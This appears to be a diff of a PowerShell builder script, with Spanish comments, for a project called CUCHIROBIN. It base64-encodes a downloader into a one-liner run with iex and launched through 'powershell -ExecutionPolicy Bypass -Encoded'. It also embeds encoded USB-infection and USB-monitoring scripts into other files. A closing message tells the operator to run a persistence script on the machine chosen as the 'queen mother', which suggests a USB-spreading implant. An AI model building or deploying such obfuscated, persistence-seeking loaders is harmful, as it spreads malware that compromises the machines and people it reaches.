@@ -81,23 +81,6 @@ foreach ($archivo in $archivos) {
 #Ahora a sustituir los otros ficheros
 #$Downloader_base64 =  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/Downloader.ps1" )))
 
-#$usbin_base64 =   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/USBin.ps1" )))
-$usbin_base64=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/USBin.ps1") -join "`r`n"))
-
-
-$monitor_base64 =  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/MonitorUSB.ps1" )))
-
-$s = Get-Content .\src\Downloader.ps1 | Out-String
-$j = [PSCustomObject]@{
-  "Script" =  [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
-} | ConvertTo-Json -Compress
-
-$oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"
-
-$c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
-
-("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded " + $c) | Out-File -Encoding Default script.cmd
-
 $s = Get-Content .\src\Downloader.ps1 | Out-String
 $j = [PSCustomObject]@{
   "Script" =  [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
@@ -108,6 +91,39 @@ $oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64S
 $c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
 
 $Downloader_base64= ("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded " + $c) 
+
+
+
+
+
+foreach ($archivo in $archivos) {
+    $contenido = Get-Content $archivo.FullName
+    #Write-Host "Procesando $archivo"
+    for ($i = 0; $i -lt $contenido.Count; $i++) {
+        
+        if ($contenido[$i] -match '^\$downloader=') {
+            $contenido[$i] = "`$downloader=`"$Downloader_base64`""
+           #Write-Host "Encontrado Downloader en $archivo.FullName"
+           # $contenido[$i]
+        }
+        
+        
+    }
+    Set-Content $archivo.FullName $contenido
+    
+}
+
+
+
+
+
+
+$usbin_base64 =  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/USBin.ps1") -join "`r`n"))
+$monitor_base64 =  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/MonitorUSB.ps1") -join "`r`n"))
+
+
+#$monitor_base64 =  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content "./tmp/MonitorUSB.ps1" )))
+
 
 
 
@@ -124,11 +140,9 @@ $Downloader_base64= ("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPo
 
 foreach ($archivo in $archivos) {
     $contenido = Get-Content $archivo.FullName
+    #Write-Host "Procesando $archivo"
     for ($i = 0; $i -lt $contenido.Count; $i++) {
         
-        if ($contenido[$i] -match '^\$downloader=') {
-            $contenido[$i] = "`$downloader=`"$Downloader_base64`""
-        }
         if ($contenido[$i] -match '^\$file1=') {
             $contenido[$i] = "`$file1=`"$usbin_base64`""
         }
@@ -139,6 +153,10 @@ foreach ($archivo in $archivos) {
         
     }
     Set-Content $archivo.FullName $contenido
+    
 }
+
+
+
 
 Write-Host "Entra en tmp y ejecuta el powershell de Persiter en la maquina que quieras hacer de reina madre de CUCHIROBIN"
